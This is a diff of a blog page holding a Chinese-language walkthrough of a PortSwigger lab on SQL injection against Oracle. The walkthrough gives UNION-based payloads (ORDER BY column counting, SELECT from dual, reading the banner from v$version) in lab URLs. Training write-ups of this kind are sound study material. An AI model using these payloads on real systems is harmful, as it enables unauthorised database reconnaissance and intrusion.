@@ -56,39 +56,18 @@
     </div>
   </header>
   <div class="article-content">
-    
-# Lab: SQL injection attack, querying the database type and version on Oracle
-
-1.Gifts  #随机点一个分类，看到页面中有回显
-
-2.hackbar注入Gifts‘ order by x -- a # 用x来测试数据库的列数，得到两列
-
-https://0ab600b5035f19c580fc0d54003c005c.web-security-academy.net/filter?category=Gifts' order by x -- a
-
-3.hackbar注入Gifts’ union select NULL, NULL from dual -- a # 存在回显，联合查询可用
-
-https://0ab600b5035f19c580fc0d54003c005c.web-security-academy.net/filter?category=Gifts' union select NULL, NULL from dual -- a
-
-4.hackbar注入Gifts’ union select 'a', NULL from dual -- a或Gifts’ union select NULL, 'a' from dual -- a # 判断那一列可以查询字符串
-
-https://0ab600b5035f19c580fc0d54003c005c.web-security-academy.net/filter?category=Gifts' union select NULL, NULL from dual -- a
-
-5.hackbar注入Gifts' union select  banner, NULL from v$version -- a
-
-https://0ab600b5035f19c580fc0d54003c005c.web-security-academy.net/filter?category=Gifts' union select  banner, NULL from v$version -- a
-
-## 注：
-
-1.Oracle数据库中每个select语句必须指定要选择的表，可以使用内置表dual来构造payload
-
-2.Oracle没有version()内置函数，version是Oracle的“动态性能视图”，固定前缀v$,banner是视图里的一个字符型列，保存版本信息
-
-3.order by x # 按第x列排序
-
-
-
-
-
+    <h1 id="Lab-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><a href="#Lab-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle" class="headerlink" title="Lab: SQL injection attack, querying the database type and version on Oracle"></a>Lab: SQL injection attack, querying the database type and version on Oracle</h1><p>1.Gifts  #随机点一个分类，看到页面中有回显</p>
+<p>2.hackbar注入Gifts‘ order by x – a # 用x来测试数据库的列数，得到两列</p>
+<p><a target="_blank" rel="noopener" href="https://0ab600b5035f19c580fc0d54003c005c.web-security-academy.net/filter?category=Gifts">https://0ab600b5035f19c580fc0d54003c005c.web-security-academy.net/filter?category=Gifts</a>‘ order by x – a</p>
+<p>3.hackbar注入Gifts’ union select NULL, NULL from dual – a # 存在回显，联合查询可用</p>
+<p><a target="_blank" rel="noopener" href="https://0ab600b5035f19c580fc0d54003c005c.web-security-academy.net/filter?category=Gifts">https://0ab600b5035f19c580fc0d54003c005c.web-security-academy.net/filter?category=Gifts</a>‘ union select NULL, NULL from dual – a</p>
+<p>4.hackbar注入Gifts’ union select ‘a’, NULL from dual – a或Gifts’ union select NULL, ‘a’ from dual – a # 判断那一列可以查询字符串</p>
+<p><a target="_blank" rel="noopener" href="https://0ab600b5035f19c580fc0d54003c005c.web-security-academy.net/filter?category=Gifts">https://0ab600b5035f19c580fc0d54003c005c.web-security-academy.net/filter?category=Gifts</a>‘ union select NULL, NULL from dual – a</p>
+<p>5.hackbar注入Gifts’ union select  banner, NULL from v$version – a</p>
+<p><a target="_blank" rel="noopener" href="https://0ab600b5035f19c580fc0d54003c005c.web-security-academy.net/filter?category=Gifts">https://0ab600b5035f19c580fc0d54003c005c.web-security-academy.net/filter?category=Gifts</a>‘ union select  banner, NULL from v$version – a</p>
+<h2 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h2><p>1.Oracle数据库中每个select语句必须指定要选择的表，可以使用内置表dual来构造payload</p>
+<p>2.Oracle没有version()内置函数，version是Oracle的“动态性能视图”，固定前缀v$,banner是视图里的一个字符型列，保存版本信息</p>
+<p>3.order by x # 按第x列排序</p>
 
   </div>
 </article>
